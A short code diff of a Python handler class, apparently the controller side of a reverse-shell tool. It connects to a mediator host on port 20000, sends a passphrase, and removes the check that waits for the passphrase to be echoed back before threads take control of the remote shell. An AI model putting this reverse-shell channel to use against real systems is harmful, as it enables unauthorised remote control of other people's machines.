@@ -96,11 +96,6 @@ class Handler:
         self.shell.connect((gethostbyname(mediatorHost), 20000))
         # send verification
         self.shell.sendall("I solemnly swear that I am up to no good.".encode())
-        # wait for verification that we are bridged to the reverse shell
-        print("Connecting to reverse shell...")
-        shellKey = self.shell.recv(1024)
-        if shellKey.decode() != "I solemnly swear that I am up to no good.":
-            exit()
 
     def run(self):
         # start I/O threads to control the reverse shell
